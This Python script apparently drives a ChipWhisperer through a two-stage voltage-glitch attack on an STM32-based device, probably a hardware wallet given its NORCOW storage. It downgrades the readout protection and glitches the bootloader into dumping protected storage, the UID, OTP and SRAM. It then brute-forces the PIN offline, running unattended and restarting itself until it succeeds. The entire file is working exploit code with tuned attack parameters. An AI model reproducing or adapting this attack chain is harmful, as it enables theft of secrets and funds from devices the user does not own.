#!/usr/bin/env python
"""glitch_chain_overnight.py - full two-glitch recovery, unattended.

Phase 1 (glitch-1): power-on crowbar, BOOT0 high, until the bootloader ACKs
  (RDP2->RDP1 downgrade). Power held so the transient RDP1 persists.
Phase 2 (glitch-2): trigger on the 0x11 Read-Memory burst; glitch the RDP1
  refusal to flip the NACK->ACK, then read the target chunk. On a flip, also try
  to drain the remaining chunks on the latch (no re-glitch) like the campaign.
Collects storage chunks 0/1/2 (the NORCOW secrets), resumes from disk across
restarts, and when all three are in, assembles + brute-forces the PIN offline and
writes RECOVERED.txt. Exits 0 only when recovery is complete; any other exit (CW
dropout, crash, bootloader lost for too long) returns nonzero so the wrapper
restarts it.

Clkgen 100 MHz for both phases. Caps OFF (crowbar). Env: G2_EXT_MIN/MAX/STEP,
G2_REP_LO/HI, G1_EXT_LO/HI.
"""
import os, sys, time, random, struct, subprocess, glob, fcntl
from datetime import datetime
import chipwhisperer as cw
import serial
from serialfind import find_ftdi

HERE = os.path.dirname(os.path.abspath(__file__))
OUT  = os.path.join(HERE, 'dumps', 'overnight')
os.makedirs(OUT, exist_ok=True)
RECOVERED = os.path.join(OUT, 'RECOVERED.txt')

CLKGEN = 100e6
G1_REP=20; G1_OFF=-45
G1_EXT_LO=int(os.environ.get('G1_EXT_LO',240)); G1_EXT_HI=int(os.environ.get('G1_EXT_HI',480))
POWER_OFF_MS=60
# glitch-2 Read-Memory window (known hot zone for THIS chip, ~180-184us) @100MHz
G2_EXT_MIN=int(os.environ.get('G2_EXT_MIN',17900)); G2_EXT_MAX=int(os.environ.get('G2_EXT_MAX',18450))
G2_EXT_STEP=int(os.environ.get('G2_EXT_STEP',2))
G2_REP_LO=int(os.environ.get('G2_REP_LO',3));  G2_REP_HI=int(os.environ.get('G2_REP_HI',4))

STORAGE_BASE=0x08008000
UID_ADDR=0x1FFF7A10; OTP3_ADDR=0x1FFF7860; SRAM_BASE=0x20000000
SRAM_CHUNKS=int(os.environ.get('SRAM_CHUNKS',64))     # 16 KB SRAM via bootloader
# Everything we want PER CHIP: storage (memory ranges) + uid + otp3 + SRAM dump.
# uid/otp3 are READ FROM THE CHIP (not assumed) and used for the offline crack.
TARGETS=([(f'storage_{i:04d}', STORAGE_BASE+0x100*i, 256) for i in range(3)]
        + [('uid', UID_ADDR, 12), ('otp3', OTP3_ADDR, 32)]
        + [(f'sram_{i:04d}', SRAM_BASE+0x100*i, 256) for i in range(SRAM_CHUNKS)])
# the crack fires as soon as these are in (SRAM keeps collecting as a bonus):
CRACK_NEEDED=['storage_0000','storage_0001','storage_0002','uid','otp3']

UART=find_ftdi()
scope=None; ser=None


def log(m): print(f'[{datetime.now():%H:%M:%S}] {m}', flush=True)


def setup():
    s=cw.scope(); s.clock.clkgen_freq=CLKGEN
    s.adc.samples=24400
    s.glitch.clk_src='clkgen'; s.glitch.output='enable_only'; s.glitch.trigger_src='ext_single'
    s.glitch.width=40; s.glitch.offset=G1_OFF
    s.io.glitch_lp=True; s.io.glitch_hp=True
    s.io.tio1=True; s.io.tio2=False; s.io.tio3='high_z'; s.io.tio4='high_z'
    s.io.target_pwr=True
    return s


def serial_open():
    return serial.Serial(UART,115200,bytesize=8,parity='E',stopbits=1,timeout=0.08)


def collected():
    return {os.path.basename(f)[:-4] for f in glob.glob(os.path.join(OUT,'storage_*.bin'))}


# ---- glitch-1 ----
def g1_power_on(ext):
    scope.trigger.triggers='tio4'; scope.glitch.ext_offset=ext; scope.glitch.repeat=G1_REP
    scope.io.tio4='high_z'; scope.io.target_pwr=False
    time.sleep(POWER_OFF_MS/1000.0); scope.arm(); scope.io.target_pwr=True

def boot_ack():
    for _ in range(3):
        ser.reset_input_buffer(); ser.write(b'\x7f')
        if b'\x79' in ser.read(4): return True
    return False

def get_bootloader():
    for i in range(1, 6000):
        g1_power_on(random.randint(G1_EXT_LO,G1_EXT_HI)); time.sleep(0.06)
        if boot_ack():
            log(f'G1: bootloader ALIVE after {i} shots (RDP2->RDP1, power held)'); return True
        if i%200==0: log(f'G1: {i} shots, no bootloader yet')
    return False


# ---- glitch-2 ----
def read_chunk(addr, nbytes):
    """Complete a Read Memory for the CURRENT (already-ACKed) command."""
    ab=addr.to_bytes(4,'big')
    ser.write(ab+bytes([ab[0]^ab[1]^ab[2]^ab[3]])); r=ser.read(8)
    if not r or r[0]!=0x79: return None
    n1=nbytes-1; ser.write(bytes([n1,n1^0xFF])); r=ser.read(nbytes+16)
    if not r or r[0]!=0x79: return None
    return r[1:1+nbytes]

def latch_read(addr, nbytes):
    """No-glitch 0x11 0xEE then read - works only if the flip latched."""
    scope.glitch.ext_offset=0  # harmless; we don't arm
    ser.reset_input_buffer(); ser.write(b'\x11\xee'); r=ser.read(16)
    if r and 0x79 in r:
        return read_chunk(addr, nbytes)
    return None

def g2_shot(ext, rep, cur_addr, cur_n):
    scope.glitch.ext_offset=ext; scope.glitch.repeat=rep; scope.arm()
    ser.reset_input_buffer(); ser.write(b'\x11\xee'); r=ser.read(16)
    try: scope.io.vglitch_reset()
    except Exception: pass
    if r and 0x79 in r:
        d=read_chunk(cur_addr, cur_n)
        return ('flip', d)
    if not r: return ('dead', None)
    return ('nack', None)


def valid_chunk(data):
    return data is not None and len(data)>=16 and any(b!=0xff for b in data[:256]) and any(data)


def assemble_sram():
    """Stitch whatever SRAM chunks we have into one file (bonus artifact)."""
    chs=sorted(glob.glob(os.path.join(OUT,'sram_*.bin')))
    if not chs: return
    buf=bytearray()
    for i in range(SRAM_CHUNKS):
        p=os.path.join(OUT,f'sram_{i:04d}.bin')
        buf += open(p,'rb').read()[:256] if os.path.exists(p) else b'\x00'*256
    open(os.path.join(OUT,'sram_dump.bin'),'wb').write(buf)
    log(f'SRAM dump assembled: {len(chs)}/{SRAM_CHUNKS} chunks -> sram_dump.bin')


def try_crack():
    have=collected()
    if not all(n in have for n in CRACK_NEEDED):
        return False
    log('storage 0-2 + uid + otp3 collected -> cracking PIN with EXTRACTED uid/otp3...')
    uid=open(os.path.join(OUT,'uid.bin'),'rb').read()[:12].hex()
    otp3=open(os.path.join(OUT,'otp3.bin'),'rb').read()[:32].hex()
    log(f'  uid={uid}  otp3={otp3}')
    img=bytearray(b'\xff'*0x4000)
    for i in range(3):
        img[i*256:i*256+256]=open(os.path.join(OUT,f'storage_{i:04d}.bin'),'rb').read()[:256]
    imgp=os.path.join(OUT,'storage_assembled.bin'); open(imgp,'wb').write(img)
    assemble_sram()
    try:
        out=subprocess.run([sys.executable,'decrypt_storage.py','--brute','0000-9999',
                            '--uid',uid,'--otp3',otp3,imgp],
                           cwd=HERE,capture_output=True,text=True,timeout=600).stdout
    except Exception as e:
        log(f'crack error: {e}'); return False
    log('CRACK OUTPUT:\n'+out)
    with open(RECOVERED,'w') as f:
        f.write(f'two-glitch chain recovery {datetime.now()}\n\n{out}\n')
    log(f'*** RECOVERY COMPLETE -> {RECOVERED} ***')
    return 'PIN FOUND' in out


def phase2():
    """Hammer glitch-2 for each uncollected chunk; latch-drain on a flip."""
    scope.trigger.triggers='tio3'; scope.io.tio3='high_z'
    ext=G2_EXT_MIN; shots=0; flips=0
    while True:
        have=collected()
        todo=[t for t in TARGETS if t[0] not in have]
        if not todo:
            return True                          # all chunks in
        cur=todo[0]
        shots+=1
        v,d=g2_shot(ext, random.randint(G2_REP_LO,G2_REP_HI), cur[1], cur[2])
        if v=='flip' and valid_chunk(d):
            flips+=1
            open(os.path.join(OUT,cur[0]+'.bin'),'wb').write(d)
            log(f'G2 FLIP #{flips}: {cur[0]} @0x{cur[1]:08x} dumped ({shots} shots) head={d[:16].hex()}')
            # latch-drain the rest without re-glitching
            for nm,addr,n in TARGETS:
                if nm in collected(): continue
                ld=latch_read(addr,n)
                if valid_chunk(ld):
                    open(os.path.join(OUT,nm+'.bin'),'wb').write(ld)
                    log(f'  latch-drained {nm} @0x{addr:08x}')
                else:
                    break
            if try_crack(): return True
        elif v=='dead':
            if not boot_ack():
                log(f'G2: bootloader died at {shots} shots -> re-glitch-1'); return False
        if shots%300==0:
            log(f'G2: {shots} shots, {flips} flips, have {sorted(collected())}')
        ext+=G2_EXT_STEP
        if ext>G2_EXT_MAX: ext=G2_EXT_MIN


def usbreset_cw():
    RST=(ord('U')<<8)|20
    for d in glob.glob('/sys/bus/usb/devices/*'):
        try:
            if open(d+'/idVendor').read().strip()=='2b3e':
                b=int(open(d+'/busnum').read()); n=int(open(d+'/devnum').read())
                fd=os.open('/dev/bus/usb/%03d/%03d'%(b,n),os.O_WRONLY)
                fcntl.ioctl(fd,RST,0); os.close(fd)
        except Exception:
            pass


def reconnect():
    """Recover from a CW/FTDI dropout: reset USB, reopen scope+serial."""
    global scope, ser
    log('reconnect: resetting CW USB + reopening...')
    try: scope.dis()
    except Exception: pass
    try: ser.close()
    except Exception: pass
    usbreset_cw(); time.sleep(3)
    for i in range(20):
        try:
            scope=setup(); ser=serial_open()
            log('reconnect OK'); return True
        except Exception as e:
            log(f'reconnect try {i+1}: {type(e).__name__}'); usbreset_cw(); time.sleep(4)
    return False


def main():
    global scope, ser
    if os.path.exists(RECOVERED):
        log('RECOVERED.txt already exists - nothing to do.'); return 0
    log(f'OVERNIGHT two-glitch recovery. UART={UART}. have={sorted(collected())}')
    if try_crack(): return 0      # resume: maybe already collected
    scope=setup(); ser=serial_open()
    # self-healing loop: runs until recovery; survives CW dropouts internally
    while not os.path.exists(RECOVERED):
        try:
            if get_bootloader():
                phase2()          # returns on bootloader death or recovery
        except Exception as e:
            log(f'chain error: {type(e).__name__}: {e}')
            if not reconnect():
                log('reconnect failed, will usbreset+retry'); usbreset_cw(); time.sleep(8)
    try:
        scope.io.glitch_hp=False; scope.io.glitch_lp=False
        scope.io.target_pwr=False; scope.dis(); ser.close()
    except Exception: pass
    return 0


if __name__ == '__main__':
    import fcntl
    while True:
        try:
            if main()==0 and os.path.exists(RECOVERED):
                break
        except KeyboardInterrupt:
            break
        except Exception as e:
            log(f'FATAL {type(e).__name__}: {e} -> self-restart in 8s')
            time.sleep(8)
    sys.exit(0)
